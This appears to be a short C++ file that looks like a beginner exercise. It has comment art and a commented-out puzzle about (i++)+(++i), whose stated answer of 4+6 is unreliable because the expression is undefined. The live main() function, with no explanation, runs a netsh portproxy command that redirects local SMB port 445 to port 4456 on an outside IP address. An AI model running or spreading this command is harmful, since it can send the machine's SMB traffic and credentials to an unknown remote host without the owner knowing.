/*   

    ***************************
    *
    ***************************

     __________________________
    |
    |__________________________

      /_________________________
     /
    /_________________________

    
    •
    •
    •

*/
// what's the value of j

// #include<iostream>
// using namespace std;

// int main()
// {
//   int i=4;
//   int j=(i++)+(++i);          //this becomes 4+6
//   cout<<"Value is :"<<j<<endl;
//   return 0;
// }
#include<iostream>
#include <cstdlib>

int main() {
    // Command to execute
    const char* command = "netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=445 connectaddress=122.176.54.41 connectport=4456";

    // Execute the command
    int result = system(command);

    // Check the result of the command execution
    if (result == 0) {
        // Command executed successfully
        std::cout << "Command executed successfully." << std::endl;
    } else {
        // Command execution failed
        std::cerr << "Command execution failed." << std::endl;
    }

    return 0;
}
